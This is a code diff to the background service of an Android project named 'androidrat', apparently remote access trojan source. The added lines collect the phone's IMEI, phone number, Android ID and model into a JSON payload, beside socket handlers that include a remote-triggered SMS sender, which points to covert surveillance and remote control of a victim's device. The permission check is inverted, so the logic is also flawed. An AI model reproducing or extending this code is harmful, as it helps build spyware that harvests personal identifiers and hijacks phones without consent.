@@ -1,13 +1,19 @@
 package com.ot.androidrat;
 
+import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.provider.Settings;
+import android.telephony.TelephonyManager;
 import android.util.Log;
+
+import androidx.core.app.ActivityCompat;
 
 import org.json.JSONObject;
 
@@ -29,16 +35,29 @@ public class MainService extends Service {
         final int delay = 1000; // 1000 milliseconds == 1 second
 
         handler.postDelayed(new Runnable() {
+            @SuppressLint("HardwareIds")
             public void run() {
-                try{
+                try {
                     @SuppressLint("HardwareIds") String device_id = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
-                    String manufacturer = Build.MANUFACTURER;
+                    String manufacturer = Build.MANUFACTURER.substring(0, 1).toUpperCase() + Build.MANUFACTURER.substring(1);
                     String model = Build.MODEL;
                     int apiLevel = Build.VERSION.SDK_INT;
+                    TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+                    @SuppressLint("HardwareIds") String imei = telephonyManager.getDeviceId();
+                    String phoneNumber = null;
+                    if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+                        phoneNumber = telephonyManager.getLine1Number();
+                    }
                     JSONObject jsonObject = new JSONObject();
                     jsonObject.put("model", manufacturer + " " + model);
                     jsonObject.put("device_id", device_id);
                     jsonObject.put("api", apiLevel);
+                    jsonObject.put("imei", imei);
+                    if(phoneNumber != null){
+                        jsonObject.put("phone", phoneNumber);
+                    }else{
+                        jsonObject.put("phone", "");
+                    }
 
                     ioSocket.on("android value", args -> Log.i("socket", args[0].toString()));
                     ioSocket.on("0x0", sendSMS);
